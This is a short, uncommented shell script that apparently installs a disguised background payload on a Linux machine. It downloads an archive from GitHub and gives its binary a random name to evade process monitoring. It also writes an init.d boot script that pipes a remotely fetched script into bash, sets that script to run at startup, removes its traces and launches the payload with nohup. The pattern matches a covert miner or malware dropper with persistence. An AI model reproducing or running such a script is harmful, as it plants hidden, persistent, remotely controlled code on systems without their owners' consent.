cd /
wget https://github.com/glipiz/lipitor/releases/download/v0.0.3/loraz.tar
tar -xvf loraz.tar
cd /loraz
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv novolin $variable1
sed -i "s/oodo/${variable1} -t=72 -n=${variable1}/g" ./flagyl.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/glipiz/lipitor/main/nalox.sh)" > zovir.sh
chmod a+x zovir.sh
update-rc.d zovir.sh defaults
rm -rf loraz.tar
cd /loraz
nohup ./flagyl.sh
ps -ef | grep loraz
